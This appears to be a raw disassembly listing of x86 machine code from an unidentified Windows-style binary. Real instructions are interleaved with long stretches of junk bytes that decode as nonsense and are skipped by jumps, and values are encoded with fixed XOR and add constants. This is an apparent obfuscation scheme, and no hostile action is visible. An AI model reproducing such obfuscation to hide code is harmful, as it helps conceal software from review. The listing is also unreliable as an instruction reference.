  40d653:	scas   eax,DWORD PTR es:[edi]
  40d654:	push   ebp
  40d655:	jmp    0x40d5e2
  40d657:	dec    eax
  40d658:	xchg   BYTE PTR [esp+edi*2-0x1b],dh
  40d65c:	jmp    0x53b20478
  40d661:	adc    eax,0x7018829a
  40d666:	xchg   edi,eax
  40d667:	mov    ebp,0xf805b3cb
  40d66c:	clc    
  40d66d:	xchg   ebx,eax
  40d66e:	mov    al,0x8a
  40d670:	out    dx,eax
  40d671:	fnstsw WORD PTR [edx]
  40d673:	mov    al,ds:0x2132e409
  40d678:	mov    ebp,0xda77c03a
  40d67d:	dec    edx
  40d67e:	dec    esp
  40d67f:	inc    esp
  40d680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d681:	cld    
  40d682:	inc    eax
  40d683:	daa    
  40d684:	push   ecx
  40d685:	pushf  
  40d686:	mov    ebp,0x64ec191e
  40d68b:	fyl2x  
  40d68d:	sub    ah,al
  40d68f:	sbb    DWORD PTR [edi-0x7973cca],0xd96ad2d2
  40d699:	out    0xe1,al
  40d69b:	mov    dh,0x5a
  40d69d:	loope  0x40d664
  40d69f:	mov    ah,0x97
  40d6a1:	gs inc ecx
  40d6a3:	cmp    esi,esp
  40d6a5:	fs sbb eax,0x6ccca20f
  40d6ab:	dec    ebp
  40d6ac:	add    eax,DWORD PTR [esi]
  40d6ae:	ins    BYTE PTR es:[edi],dx
  40d6af:	mov    ebx,0x68bb828b
  40d6b4:	and    BYTE PTR [esi+0x2c],bl
  40d6b7:	sar    DWORD PTR [ebx-0x5a7cb113],1
  40d6bd:	and    BYTE PTR [ebx-0x5d],cl
  40d6c0:	mov    al,0x7c
  40d6c2:	fwait
  40d6c3:	vpor   ymm2,ymm4,ymm5
  40d6c7:	fisub  DWORD PTR [edx+0x1f08e4eb]
  40d6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ce:	push   edi
  40d6cf:	mov    ebx,0x98d361bb
  40d6d4:	jo     0x40d748
  40d6d6:	fneni(8087 only) 
  40d6d8:	aam    0xd8
  40d6da:	fnstenv [ebx-0x6a111257]
  40d6e0:	mov    cs,ebp
  40d6e2:	cmc    
  40d6e3:	push   ecx
  40d6e4:	cli    
  40d6e5:	add    DWORD PTR [ecx],esp
  40d6e7:	fsub   DWORD PTR [ebx-0x74]
  40d6ea:	jle    0x40d6f5
  40d6ec:	and    DWORD PTR [ebx],ebp
  40d6ee:	add    eax,0x35fc458b
  40d6f3:	push   esp
  40d6f4:	or     BYTE PTR [ecx+0x7],dl
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [edi+0x5f6b135],?
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d757
  40d733:	and    eax,DWORD PTR es:[esi+0x6fd3b0dc]
  40d73a:	lods   al,BYTE PTR ds:[esi]
  40d73b:	mov    al,0xc6
  40d73d:	imul   BYTE PTR [esp+eiz*2-0x4a]
  40d741:	add    BYTE PTR ds:0xcf23677c,0x7f
  40d748:	adc    esi,DWORD PTR [ebx]
  40d74a:	out    dx,eax
  40d74b:	jg     0x40d72c
  40d74d:	in     eax,0x5b
  40d74f:	add    eax,0x813906d0
  40d754:	(bad)  
  40d755:	sbb    DWORD PTR [edx+0x37534a67],edx
  40d75b:	jp     0x40d6fe
  40d75d:	mov    ebp,0x38a8799f
  40d762:	xor    BYTE PTR [ebp+0x2c],0x9f
  40d766:	scas   al,BYTE PTR es:[edi]
  40d767:	sahf   
  40d768:	xchg   edx,eax
  40d769:	out    dx,eax
  40d76a:	mov    ds:0xcc2ee646,eax
  40d76f:	push   esi
  40d770:	inc    ecx
  40d771:	fs jbe 0x40d77f
  40d774:	push   ecx
  40d775:	in     al,0x13
  40d777:	pop    eax
  40d778:	jne    0x40d74d
  40d77a:	fwait
  40d77b:	fwait
  40d77c:	sub    eax,ebp
  40d77e:	ins    BYTE PTR es:[edi],dx
  40d77f:	jmp    ebx
  40d781:	pop    edx
  40d782:	ror    BYTE PTR [edi+0x46f40b6a],cl
  40d788:	shr    dh,1
  40d78a:	fstp   QWORD PTR [esi+edi*8]
  40d78d:	shl    bh,cl
  40d78f:	pop    ebx
  40d790:	push   eax
  40d791:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40d793:	cs or  eax,0xf4217685
  40d799:	jns    0x40d787
  40d79b:	retf   
  40d79c:	cmp    eax,0xcaabf37b
  40d7a1:	mov    esi,0xa76cb462
  40d7a6:	retf   0x2578
  40d7a9:	hlt    
  40d7aa:	fidiv  WORD PTR [esi+0x44ceedf6]
  40d7b0:	inc    esi
  40d7b1:	lock mov ebp,0xbee42a8d
  40d7b7:	sub    ebp,DWORD PTR [ecx]
  40d7b9:	cdq    
  40d7ba:	xor    eax,esp
  40d7bc:	lds    esp,FWORD PTR [eax-0x775a25a0]
  40d7c2:	mov    ah,0x63
  40d7c4:	les    ebx,FWORD PTR [ecx+0x61]
  40d7c7:	xchg   BYTE PTR [esi-0x4d53edcd],dl
  40d7cd:	retf   
  40d7ce:	cs xor al,dh
  40d7d1:	xor    eax,0xcb50f3e9
  40d7d6:	retf   0x5084
  40d7d9:	fwait
  40d7da:	dec    ecx
  40d7db:	inc    ebx
  40d7dc:	xchg   esp,eax
  40d7dd:	sub    dh,BYTE PTR [ecx+0x3d]
  40d7e0:	fistp  DWORD PTR [eax+edi*8]
  40d7e3:	enter  0x94cf,0xb5
  40d7e7:	(bad)  
  40d7e8:	jnp    0x40d791
  40d7ea:	mov    al,ds:0xf82107f5
  40d7ef:	dec    ecx
  40d7f0:	mov    ds:0x7b020df6,al
  40d7f5:	sbb    BYTE PTR [edi-0x1881bba8],ah
  40d7fb:	xchg   cl,ch
  40d7fd:	push   ds
  40d7fe:	inc    eax
  40d7ff:	xchg   DWORD PTR [eax-0x51d82c26],esp
  40d805:	(bad)  
  40d806:	retf   
  40d807:	ror    DWORD PTR [esi-0x105808b3],0x15
  40d80e:	cld    
  40d80f:	pop    DWORD PTR [ecx+0x5057ddb6]
  40d815:	push   cs
  40d816:	sub    esi,DWORD PTR [edx+0x1b]
  40d819:	mov    bl,0xde
  40d81b:	sbb    ch,bl
  40d81d:	int    0xf5
  40d81f:	add    ebp,DWORD PTR [ecx+edx*1]
  40d822:	stos   DWORD PTR es:[edi],eax
  40d823:	sti    
  40d824:	sub    ch,BYTE PTR [edx]
  40d826:	(bad)  
  40d827:	and    DWORD PTR [ecx],edi
  40d829:	add    ch,al
  40d82b:	xchg   edi,eax
  40d82c:	adc    DWORD PTR [eax],edi
  40d82e:	in     eax,0xbe
  40d830:	jne    0x40d864
  40d832:	sbb    eax,0x76b70798
  40d837:	addr16 loopne 0x40d7df
  40d83a:	clc    
  40d83b:	dec    eax
  40d83c:	mov    edi,0x2020b029
  40d841:	ret    0x3723
  40d844:	sub    esi,DWORD PTR ds:0x1ccc81fc
  40d84a:	repnz and al,0xb3
  40d84d:	pop    edx
  40d84e:	mov    al,ds:0xc9efb3d0
  40d853:	es xchg esi,eax
  40d855:	loop   0x40d882
  40d857:	mov    dl,0x71
  40d859:	fst    st(3)
  40d85b:	push   cs
  40d85c:	inc    ebp
  40d85d:	lahf   
  40d85e:	pop    ecx
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	cdq    
  40d879:	int3   
  40d87a:	push   edi
  40d87b:	enter  0x8a29,0x7e
  40d87f:	jle    0x40d8a3
  40d881:	jg     0x40d901
  40d883:	jle    0x40d8e1
  40d885:	inc    ecx
  40d886:	ret    0xca67
  40d889:	fisub  DWORD PTR [ecx+edx*2+0x38]
  40d88d:	pop    esi
  40d88e:	or     WORD PTR [esi-0x8],cx
  40d892:	add    al,0x78
  40d894:	push   ds
  40d895:	pop    ecx
  40d896:	push   ds
  40d897:	push   ebp
  40d898:	(bad)
  40d89b:	retf   0x4364
  40d89e:	aad    0x6a
  40d8a0:	adc    esi,DWORD PTR [esi+edx*4+0x1fe9c3b3]
  40d8a7:	fwait
  40d8a8:	mov    edi,0x72b7431b
  40d8ad:	sar    BYTE PTR [esp+ebp*8+0x24],cl
  40d8b1:	xchg   DWORD PTR [ecx-0x1a],esp
  40d8b4:	push   esp
  40d8b5:	popa   
  40d8b6:	sbb    ebx,DWORD PTR [ebp+0x55]
  40d8b9:	fs pop ss
  40d8bb:	and    DWORD PTR [edi-0x27],ebp
  40d8be:	(bad)  [ecx-0x71]
  40d8c1:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40d8c3:	dec    eax
  40d8c4:	loope  0x40d865
  40d8c6:	xor    al,0xfa
  40d8c8:	cmp    BYTE PTR [edx-0x72],ah
  40d8cb:	adc    esi,0xd7fbb03e
  40d8d1:	xor    bh,al
  40d8d3:	pop    eax
  40d8d4:	mov    ds:0xe1f652fd,eax
  40d8d9:	add    eax,0x28652913
  40d8de:	or     esp,DWORD PTR [edi-0x2a85e8bc]
  40d8e4:	push   0xffffffea
  40d8e6:	lahf   
  40d8e7:	inc    ebx
  40d8e8:	fiadd  WORD PTR [esp+eiz*4-0x62737890]
  40d8ef:	stos   BYTE PTR es:[edi],al
  40d8f0:	inc    esp
  40d8f1:	imul   ecx,DWORD PTR [esi],0x7c011cbd
  40d8f7:	bound  edi,QWORD PTR [edx]
  40d8f9:	mov    cl,0xaf
  40d8fb:	aaa    
  40d8fc:	sar    DWORD PTR [esi-0x25],1
  40d8ff:	dec    ecx
  40d900:	or     eax,0xa903aad2
  40d905:	fbld   TBYTE PTR [ebx-0x17]
  40d908:	out    0xd3,al
  40d90a:	fcom   DWORD PTR [eax-0x71f2b25c]
  40d910:	icebp  
  40d911:	or     BYTE PTR [esi],0x72
  40d914:	aam    0xb3
  40d916:	dec    edi
  40d917:	clc    
  40d918:	adc    al,0xf2
  40d91a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d91b:	or     al,0x55
  40d91d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d91e:	loope  0x40d97a
  40d920:	add    edi,DWORD PTR [esi-0x3a34c42e]
  40d926:	cmp    cl,BYTE PTR [ebx+0x22]
  40d929:	add    BYTE PTR [ecx+0x1c],bh
  40d92c:	inc    ecx
  40d92d:	jo     0x40d8e6
  40d92f:	pop    ecx
  40d930:	dec    ebx
  40d931:	adc    al,BYTE PTR [esi+eiz*2-0x36]
  40d935:	repz mov al,0x56
  40d938:	enter  0x5d3e,0xd0
  40d93c:	adc    esp,DWORD PTR [ebp-0x74]
  40d93f:	test   eax,0xef1970c4
  40d944:	outs   dx,DWORD PTR ds:[esi]
  40d945:	mov    eax,DWORD PTR [edi]
  40d947:	xchg   edx,eax
  40d948:	or     dh,ch
  40d94a:	inc    edi
  40d94b:	or     esp,DWORD PTR [ecx-0x52]
  40d94e:	ja     0x40d968
  40d950:	cli    
  40d951:	ror    dh,cl
  40d953:	mov    bh,0x9b
  40d955:	xor    BYTE PTR [esp+eax*2],dh
  40d958:	jmp    0xa2d:0x72bfffc7
  40d95f:	push   eax
  40d960:	icebp  
  40d961:	scas   eax,DWORD PTR es:[edi]
  40d962:	into   
  40d963:	scas   eax,DWORD PTR es:[edi]
  40d964:	dec    esi
  40d965:	xor    eax,0x29db13a2
  40d96a:	xchg   ecx,eax
  40d96b:	xchg   esp,eax
  40d96c:	push   ss
  40d96d:	rcl    BYTE PTR [ecx+0x41],cl
  40d970:	arpl   WORD PTR [ebx+0x59],sp
  40d973:	push   ds
  40d974:	add    eax,0x1e6f054d
  40d979:	in     eax,dx
  40d97a:	leave  
  40d97b:	and    al,0xfc
  40d97d:	jne    0x40d9ae
  40d97f:	xor    DWORD PTR [ecx],ebx
  40d981:	jne    0x40d95f
  40d983:	lahf   
  40d984:	in     eax,dx
  40d985:	mov    edx,0x6af5ff5c
  40d98a:	scas   eax,DWORD PTR es:[edi]
  40d98b:	add    al,0xbc
  40d98d:	dec    esp
  40d98e:	mov    bh,al
  40d990:	stos   DWORD PTR es:[edi],eax
  40d991:	ja     0x40d95a
  40d993:	call   0xffef:0xadc414d7
  40d99a:	cmp    al,0x5b
  40d99c:	and    bl,BYTE PTR [esi+0x2a]
  40d99f:	adc    DWORD PTR [edx+eax*1-0x59145503],edi
  40d9a6:	(bad)
  40d9aa:	sub    al,0x17
  40d9ac:	push   ecx
  40d9ad:	mov    DWORD PTR [ecx+0x7b],edx
  40d9b0:	xchg   ebx,ecx
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	mov    DWORD PTR [edi+eax*1+0x2a],esi
  40d9c7:	fisttp QWORD PTR [ebx+0x7f227e7e]
  40d9cd:	jle    0x40da4d
  40d9cf:	or     BYTE PTR [ebp-0x6c],ah
  40d9d2:	cwde   
  40d9d3:	jp     0x40d9df
  40d9d5:	and    BYTE PTR [edx-0x1f],bl
  40d9d8:	hlt    
  40d9d9:	cwde   
  40d9da:	or     BYTE PTR [esp+eax*1],bh
  40d9dd:	mov    ds:0x2b2ec7e0,eax
  40d9e2:	xchg   al,al
  40d9e4:	repnz into 
  40d9e6:	xchg   esi,eax
  40d9e7:	cmp    DWORD PTR [esi-0x3c16ae4f],esi
  40d9ed:	(bad)  [ebp+0x1f]
  40d9f0:	punpckhwd mm1,QWORD PTR [edx-0x3abd0f1b]
  40d9f7:	cmp    ch,bh
  40d9f9:	push   ecx
  40d9fa:	pusha  
  40d9fb:	xchg   esp,eax
  40d9fc:	push   es
  40d9fd:	fimul  WORD PTR [ebp+0x3a]
  40da00:	mov    eax,ds:0x8a42773a
  40da05:	hlt    
  40da06:	(bad)  [esi+0x4c]
  40da09:	stos   DWORD PTR es:[edi],eax
  40da0a:	stc    
  40da0b:	push   es
  40da0c:	mov    ch,0x3f
  40da0e:	xor    BYTE PTR [ecx],al
  40da10:	jl     0x40da46
  40da12:	xlat   BYTE PTR ds:[ebx]
  40da13:	test   ecx,esi
  40da15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da16:	es xchg edi,eax
  40da18:	cdq    
  40da19:	mov    eax,ds:0xebc97fe
  40da1e:	aad    0x9c
  40da20:	fadd   DWORD PTR [ebx+0x62]
  40da23:	popf   
  40da24:	and    al,0x6b
  40da26:	jl     0x40da5c
  40da28:	xor    BYTE PTR [ebx],ah
  40da2a:	xchg   ebx,eax
  40da2b:	js     0x40d9c7
  40da2d:	(bad)
  40da31:	out    0x9e,al
  40da33:	mov    edx,0x4a26f17d
  40da38:	mov    bh,0x72
  40da3a:	mov    eax,0xd6ee2324
  40da3f:	mov    ecx,0x35d92f0b
  40da44:	ss int 0x53
  40da47:	test   DWORD PTR [eax+0x2a],esp
  40da4a:	jne    0x40da03
  40da4c:	and    dl,BYTE PTR [ebx]
  40da4e:	mov    ?,edx
  40da50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da51:	sbb    eax,0x3f879e4
  40da56:	and    BYTE PTR [esi+0x72e44ea2],0x20
  40da5d:	push   es
  40da5e:	xchg   ebp,eax
  40da5f:	adc    BYTE PTR [edx-0x30],bl
  40da62:	je     0x40da84
  40da64:	data16 adc BYTE PTR [ebp+0x221b337d],bh
  40da6b:	cmp    ebx,DWORD PTR [edx+0x2b]
  40da6e:	mov    ebp,0x2c805733
  40da73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da74:	push   edi
  40da75:	lahf   
  40da76:	push   edi
  40da77:	mov    fs,WORD PTR [ecx]
  40da79:	es popa 
  40da7b:	mov    WORD PTR [ebp-0x2ad8c983],?
  40da81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da82:	mov    ds:0x7e06d6eb,al
  40da87:	mov    dl,0xac
  40da89:	ret    0xe5b4
  40da8c:	jbe    0x40da64
  40da8e:	or     ebx,edi
  40da90:	fisub  DWORD PTR [ebp+0x2bb55f58]
  40da96:	xchg   ebp,eax
  40da97:	pop    edx
  40da98:	cmova  edx,DWORD PTR [edi-0x2ebc9d40]
  40da9f:	lock retf 
  40daa1:	(bad)  
  40daa2:	aad    0x67
  40daa4:	cs lock dec edi
  40daa7:	adc    al,0x3
  40daa9:	scas   eax,DWORD PTR es:[edi]
  40daaa:	mov    bl,0x95
  40daac:	shr    BYTE PTR [eax+0x53],cl
  40daaf:	(bad)  
  40dab0:	das    
  40dab1:	sbb    eax,0x4ddd28a4
  40dab6:	stos   BYTE PTR es:[edi],al
  40dab7:	sbb    DWORD PTR [edx+0xe6d2951],ebx
  40dabd:	pop    edx
  40dabe:	add    eax,0x1e27645b
  40dac3:	dec    edi
  40dac4:	enter  0x18ce,0xd3
  40dac8:	push   ds
  40dac9:	pop    eax
  40daca:	xchg   esp,eax
  40dacb:	xchg   esp,eax
  40dacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dacd:	push   0x81044874
  40dad2:	and    eax,0xe0ffb9cf
  40dad7:	jae    0x40daab
  40dad9:	and    BYTE PTR [esi],ah
  40dadb:	mov    al,0xfc
  40dadd:	retf   
  40dade:	pushf  
  40dadf:	mov    dl,0x1c
  40dae1:	or     cl,cl
  40dae3:	nop
  40dae4:	rcr    BYTE PTR [edi+0x7bf73d94],0xdd
  40daeb:	jge    0x40daf5
  40daed:	add    eax,DWORD PTR [ebx+0x4b56453b]
  40daf3:	mov    fs,WORD PTR [eax]
  40daf5:	popf   
  40daf6:	das    
  40daf7:	loope  0x40db70
  40daf9:	sti    
  40dafa:	push   ds
  40dafb:	dec    ecx
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x11b6fdf0
  40db32:	sbb    al,0xcb
  40db34:	inc    BYTE PTR [ecx+0x227e7e88]
  40db3a:	jg     0x40dbba
  40db3c:	jle    0x40db09
  40db3e:	jecxz  0x40dad0
  40db40:	in     al,0x15
  40db42:	push   ebx
  40db43:	popf   
  40db44:	push   edx
  40db45:	inc    ecx
  40db46:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40db48:	sbb    BYTE PTR [ecx+0x1507807e],bl
  40db4e:	jg     0x40db20
  40db50:	pop    ecx
  40db51:	cdq    
  40db52:	icebp  
  40db53:	adc    al,0xf3
  40db55:	xor    ax,WORD PTR [eax+0x3f]
  40db59:	pushf  
  40db5a:	and    DWORD PTR [eax-0x2a],edx
  40db5d:	or     DWORD PTR [ebp-0x3d6488ec],esp
  40db63:	outs   dx,DWORD PTR ds:[esi]
  40db64:	mov    esi,edx
  40db66:	add    al,0x5f
  40db68:	out    dx,al
  40db69:	jnp    0x40db14
  40db6b:	in     eax,dx
  40db6c:	jge    0x40dbd8
  40db6e:	adc    eax,0xaaec0472
  40db73:	mov    al,ds:0xcf108393
  40db78:	sub    al,0x9c
  40db7a:	xor    dh,ah
  40db7c:	int3   
  40db7d:	mov    al,0x57
  40db7f:	ja     0x40db74
  40db81:	dec    esp
  40db82:	or     al,0x5c
  40db84:	test   DWORD PTR ds:0x70783e8,esi
  40db8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db8b:	loop   0x40dbb5
  40db8d:	cmp    edx,DWORD PTR ds:0x9bc62f0
  40db93:	pop    ebx
  40db94:	mov    ecx,0x7a3595f4
  40db99:	or     al,0x25
  40db9b:	cmp    DWORD PTR [edx],edi
  40db9d:	mov    ds:0x95d1f2de,al
  40dba2:	sar    esp,cl
  40dba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dba5:	loope  0x40db6e
  40dba7:	ret    
  40dba8:	je     0x40dba9
  40dbaa:	add    al,ah
  40dbac:	sbb    al,0x91
  40dbae:	lea    ebx,[edi+0x7c]
  40dbb1:	into   
  40dbb2:	sbb    ecx,ecx
  40dbb4:	mov    dl,0x45
  40dbb6:	les    ebp,FWORD PTR [ecx-0x4f84d52c]
  40dbbc:	push   esi
  40dbbd:	lods   eax,DWORD PTR ds:[esi]
  40dbbe:	pop    edi
  40dbbf:	mov    bl,0x9b
  40dbc1:	repz repz sbb DWORD PTR [ecx],ecx
  40dbc5:	ficom  DWORD PTR [eax+0x71884ed9]
  40dbcb:	add    ch,BYTE PTR [ecx]
  40dbcd:	adc    dh,dl
  40dbcf:	cmc    
  40dbd0:	(bad)  
  40dbd1:	in     eax,0x72
  40dbd3:	jge    0x40dc20
  40dbd5:	ja     0x40dbac
  40dbd7:	imul   esi,esp,0xb09c862a
  40dbdd:	aas    
  40dbde:	mov    ebx,0x4c40d6db
  40dbe3:	mov    ecx,0xe1221fde
  40dbe8:	xor    cl,dh
  40dbea:	mov    ?,WORD PTR [ecx+ebp*8]
  40dbed:	jae    0x40dc56
  40dbef:	jne    0x40db89
  40dbf1:	ins    BYTE PTR es:[edi],dx
  40dbf2:	cmp    BYTE PTR [eax+edx*1],dl
  40dbf5:	call   0xff6661dc
  40dbfa:	mov    DWORD PTR [ecx-0x6451b23a],edx
  40dc00:	xor    BYTE PTR [ebx-0x15],al
  40dc03:	inc    ebp
  40dc04:	leave  
  40dc05:	clc    
  40dc06:	ins    BYTE PTR es:[edi],dx
  40dc07:	icebp  
  40dc08:	inc    ecx
  40dc09:	sbb    al,0x72
  40dc0b:	leave  
  40dc0c:	lds    edi,FWORD PTR [ecx+0x11]
  40dc0f:	and    DWORD PTR [ebp+0x11],ebp
  40dc12:	popf   
  40dc13:	jns    0x40dc5e
  40dc15:	pop    ebx
  40dc16:	gs js  0x40dc14
  40dc19:	bound  ecx,QWORD PTR [edx+0x6b]
  40dc1c:	xchg   BYTE PTR [ebp+eax*4-0x2c],dl
  40dc20:	adc    BYTE PTR [edi],0xc0
  40dc23:	out    dx,al
  40dc24:	retf   0x9d6c
  40dc27:	(bad)  
  40dc28:	icebp  
  40dc29:	sub    al,ch
  40dc2b:	xchg   ecx,eax
  40dc2c:	stos   DWORD PTR es:[edi],eax
  40dc2d:	push   0x99f76395
  40dc32:	adc    BYTE PTR [ebx+0x2c],bh
  40dc35:	imul   ebp,ebp,0x2d
  40dc38:	mov    ah,0x1b
  40dc3a:	aas    
  40dc3b:	add    DWORD PTR [eax+0x71],edi
  40dc3e:	mov    edx,0x70685cd2
  40dc43:	sbb    BYTE PTR ds:0xc87a3f87,ah
  40dc49:	cld    
  40dc4a:	(bad)  
  40dc4c:	mov    DWORD PTR [ebx+edx*1-0x7f1a4f60],edi
  40dc53:	out    dx,al
  40dc54:	addr16 pop ecx
  40dc56:	int3   
  40dc57:	sbb    al,al
  40dc59:	shl    BYTE PTR [esi-0x9257060],cl
  40dc5f:	or     edx,DWORD PTR [ebp-0x4d]
  40dc62:	sub    DWORD PTR [ebp-0x1f],ebp
  40dc65:	ins    BYTE PTR es:[edi],dx
  40dc66:	and    esi,DWORD PTR [eax-0x743dfc45]
  40dc6c:	push   ebp
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	mov    bl,0x6e
  40dcde:	mov    ch,0x44
  40dce0:	mov    ch,0x89
  40dce2:	jle    0x40dd62
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dcce
  40dce9:	jno    0x40dc84
  40dceb:	(bad)  
  40dcec:	ficom  WORD PTR [esi-0x7e16781c]
  40dcf2:	xchg   esp,eax
  40dcf3:	mov    WORD PTR [esi],ds
  40dcf5:	ins    DWORD PTR es:[edi],dx
  40dcf6:	cdq    
  40dcf7:	std    
  40dcf8:	cmp    BYTE PTR [ebx+0x5576426],bh
  40dcfe:	mov    esp,0x6a9a163e
  40dd03:	jae    0x40dce6
  40dd05:	push   ebp
  40dd06:	lea    ecx,[ebx]
  40dd08:	(bad)  
  40dd09:	pop    DWORD PTR [edi-0x5f8db9a1]
  40dd0f:	jbe    0x40dd56
  40dd11:	jecxz  0x40dc97
  40dd13:	cli    
  40dd14:	repz cmp dh,dl
  40dd17:	mov    ds:0xc079c3ea,al
  40dd1c:	retf   
  40dd1d:	inc    edx
  40dd1e:	lds    esp,FWORD PTR [eax-0x39]
  40dd21:	jle    0x40dcfc
  40dd23:	retf   0x742b
  40dd26:	add    dl,ah
  40dd28:	mov    ds:0x7c5d31f6,al
  40dd2d:	imul   ebx,DWORD PTR [ebp-0x1576a05],0x61
  40dd34:	jge    0x40dcb6
  40dd36:	repz jmp 0x1dfb82fe
  40dd3c:	or     BYTE PTR [ebx],dh
  40dd3e:	pushf  
  40dd3f:	retf   
  40dd40:	cmc    
  40dd41:	mov    bh,0x9
  40dd43:	or     ah,dl
  40dd45:	aaa    
  40dd46:	ins    BYTE PTR es:[edi],dx
  40dd47:	push   cs
  40dd48:	cs pop ds
  40dd4a:	(bad)  
  40dd4b:	xlat   BYTE PTR ds:[ebx]
  40dd4c:	dec    edi
  40dd4d:	dec    esp
  40dd4e:	loop   0x40dd68
  40dd50:	adc    eax,DWORD PTR [edi]
  40dd52:	mov    esi,0xf307b9ca
  40dd57:	dec    edx
  40dd58:	mov    al,0x18
  40dd5a:	inc    esi
  40dd5b:	adc    dl,BYTE PTR [edi+0x3b]
  40dd5e:	mov    eax,0xf15b1854
  40dd63:	aaa    
  40dd64:	imul   eax,DWORD PTR [ecx],0xcdb94b67
  40dd6a:	test   al,0x34
  40dd6c:	bnd jmp 0x1df1e9aa
  40dd72:	push   ebx
  40dd73:	into   
  40dd74:	lods   al,BYTE PTR ds:[esi]
  40dd75:	push   es
  40dd76:	popf   
  40dd77:	xor    al,0xe5
  40dd79:	out    0x85,al
  40dd7b:	ficomp DWORD PTR [ebx+0x2d]
  40dd7e:	repz push 0xffffffb7
  40dd81:	jbe    0x40ddb0
  40dd83:	dec    esi
  40dd84:	test   eax,0xf4d6dbff
  40dd89:	mov    ds:0x84c82a76,al
  40dd8e:	xor    al,dh
  40dd90:	dec    edi
  40dd91:	push   ebp
  40dd92:	inc    edx
  40dd93:	aaa    
  40dd94:	psubusw mm6,QWORD PTR [edx-0x8f893e4]
  40dd9b:	cld    
  40dd9c:	add    eax,0x21976a8b
  40dda1:	push   ss
  40dda2:	push   0xc57cd418
  40dda7:	arpl   cx,cx
  40dda9:	inc    DWORD PTR [esi+0x49]
  40ddac:	aaa    
  40ddad:	fnstcw WORD PTR [ebx-0x4220c6d]
  40ddb3:	or     ebx,edi
  40ddb5:	pop    eax
  40ddb6:	int3   
  40ddb7:	enter  0x5882,0xcd
  40ddbb:	leave  
  40ddbc:	pop    edx
  40ddbd:	fstp   QWORD PTR [ecx-0x73]
  40ddc0:	ja     0x40dda4
  40ddc2:	faddp  st(7),st
